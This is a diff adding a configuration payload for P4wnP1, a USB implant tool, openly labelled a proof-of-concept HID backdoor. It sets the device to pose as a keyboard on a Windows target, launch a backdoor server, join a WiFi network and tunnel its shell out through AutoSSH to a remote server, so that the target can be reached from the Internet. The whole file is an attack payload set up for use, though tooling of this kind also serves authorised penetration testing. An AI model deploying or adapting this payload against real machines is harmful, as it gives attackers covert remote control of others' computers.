@@ -1,0 +1,154 @@
+#    This file is part of P4wnP1.
+#
+#    Copyright (c) 2017, Marcus Mengs. 
+#
+#    P4wnP1 is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    P4wnP1 is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.
+
+
+
+# P4wnP1 HID backdoor - REMOTE version
+# ====================================
+#
+# This Proof of Concept (PoC) shows how to run keyboard commands or bring up a full fledged
+# remote shell on a Windows target. It differs from the "normal" HID backdoor payload
+# because it is able to relay the backdoor through a remote SSH server and thus allows
+# accessing it from the Internet, for example.
+#
+# Usage, other than decribed in the DISCLAIMER file, isn't allowed.
+#
+# Requirements / Script setup
+# ---------------------------
+# - A WiFi network with known passphrase has to be present (WPA2), in order to serve as
+#   Network/Internet upstream
+# - The name of the upstream WiFi (ESSID) has to be stored in the option WIFI_CLIENT_SSID
+# - The passphrase of the target WiFi has to be stored in the option WIFI_CLIENT_PSK
+#
+# - The pentester using this needs to provide an SSH server which receives the SSH
+#   connection from P4wnP1. The hostname or IP address of the server has to be stored in
+#   the option AUTOSSH_REMOTE_HOST
+# - The SSH server has to allow access for the user defined by option AUTOSSH_REMOTE_USER
+# - The SSH server has to allow access for this user based on the public key referenced
+#   by the option AUTOSSH_PUBLIC_KEY (has to be present in `~/ssh/authorized_keys` file
+#   of the repective user).
+#   The SSH keypair is generated during P4wnP1 install, but could be regenerated using
+#      `P4wnP1_working_dir/ssh/genkeys.sh`
+#   If publishing the public key to the SSH server owned by the pentester shouldn't be
+#   done manually, the following script supports this task: 
+#      `P4wnP1_working_dir/ssh/pushkey.sh`
+# - the SSH server needs to grand privileges for opening unprivileged remote ports on localhost
+#   (default in most setups, AUTOSSH_REMOTE_PORT should be set to an unprivileged and unused port)
+# 
+#
+# (Short) description of inner workings
+# -------------------------------------
+# - This PoC uses the abilities of the HID_backdoor payload. This means keystrokes could be send 
+#   to a target host interactively from a shell available on P4wnP1 via SSH, as soon as P4wnP1 is
+#   connected. On Windows targets this could be used to type out a userland "driver", allowing to 
+#   bring up a covert communication channel USING ONLY A GENERIC HID DEVICE, which again allows to
+#   run remote shells (reference video: https://www.youtube.com/watch?v=Pft7voW5ui8).
+# - As stated, the interactive shell is reachable over P4wnP1's internal SSH server 
+#   (bound to a screen session internally). Internal SSH access is provided by spawning a WiFi 
+#   Access Point. One of the newer additions to P4wnP1 is the capability to join WPA2 based WiFi
+#   networks and thus gain Internet access (if provided by the WiFi).
+#   This again is combined with the latest addition of AutoSSH, in order to allow tunneling out
+#   P4wnP1's internal SSH server through an outbound SSH session. 
+# - This means, if both (WiFi connection with internet access and access to the remote SSH server)
+#   succeed, P4wnP1's HID shell is reachable through this external SSH server.
+# - The interactive P4wnP1 HID backdoor shell could now be accessed from the external SSH server
+#   with `ssh -p 8765 pi@localhost` from a whole different remote device. (8765 has to be replaced
+#   by the value set in AUTOSSH_REMOTE_PORT)
+#   
+#
+# Remark:
+#   If the SSH outbound connection fails, but joining the upstream WiFi succeeds, you won't
+#   you could access P4wnP1 only from the upstream WiFi (as the target sees only HID devices).
+#   In order to force P4wnP1 to open an AccessPoint again, disabling the upstream WiFi forces
+#   failover to Access Point mode, using the settings provided in this PoC payload.
+
+# Setup WiFi client mode (used for Upstream connection of SSH reachback)
+# ----------------------------------------------------------------------
+WIFI_CLIENT=true
+WIFI_CLIENT_SSID="ESSID-of-upstream-WLAN" # name of target network
+WIFI_CLIENT_PSK="passphrase of upstream wlan" # passphrase for target network
+
+
+# Setup WiFi access point (used as failover in case the target WiFi WIFI_CLIENT_SSID isn't present)
+# ------------------------------------------------------------------------------------------------
+WIFI_ACCESSPOINT=true
+WIFI_ACCESSPOINT_NAME="P4wnP1"
+WIFI_ACCESSPOINT_PSK="MaMe82-P4wnP1"
+WIFI_ACCESSPOINT_IP="172.24.0.1" # IP used by P4wnP1
+WIFI_ACCESSPOINT_NETMASK="255.255.255.0"
+WIFI_ACCESSPOINT_DHCP_RANGE="172.24.0.2,172.24.0.100" # DHCP Server IP Range
+WIFI_ACCESSPOINT_HIDE_SSID=false # don't hide ESSID
+
+# Setup for the upstream SSH server
+# ---------------------------------
+
+AUTOSSH_ENABLED=true # enable AutoSSH
+AUTOSSH_REMOTE_HOST=your-ssh-server.com
+AUTOSSH_REMOTE_USER=root 
+AUTOSSH_PRIVATE_KEY="$wdir/ssh/keys/P4wnP1_id"
+AUTOSSH_PUBLIC_KEY="$wdir/ssh/keys/P4wnP1_id.pub" # $wdir/ssh/pushkey.sh helps to publish this key
+AUTOSSH_REMOTE_PORT=8765 
+
+
+
+# Basic device setup
+# ------------------
+
+USB_VID="0x1D6B"        # Vendor ID
+USB_PID="0x0437"        # Product ID
+
+USE_ECM=false           # if true CDC ECM will be enabled
+USE_RNDIS=false         # if true RNDIS will be enabled
+USE_HID=true            # if true HID (keyboard) will be enabled
+USE_RAWHID=true         # if true HID raw device will be enabled
+USE_UMS=false           # if true USB Mass Storage will be enabled
+
+# disable setting of static routes for all IPv4 addresses
+ROUTE_SPOOF=false
+
+# use LED based HID keyboard test
+USE_HID_TEST=true
+
+# overwrite keyboard language from setup.cfg
+# Note: The HID backdoor server uses an own language setting, which isn't influenced
+#       by this option.
+#       The HID backdoor keyboard language could be changed in
+#                $wdir/hidtools/backdoor/config.txt
+#       or using the `SetKeyboardLanguage` command at runtime
+lang="us" 
+
+function onKeyboardUp()
+{
+
+
+	# start HID Server
+	screen -dmS hidsrv bash -c "cd $wdir/hidtools/backdoor; python P4wnP1.py"
+
+	# blink two times when hid keyboard is usable and HID server is started
+	led_blink 2
+}
+
+
+# commands in this function are ran on user login
+# the commans are ran by user "pi"
+function onLogin()
+{
+	led_blink 3
+	# try to attach the screen running the Server to this login session
+	sudo screen -d -r
+	return
+}
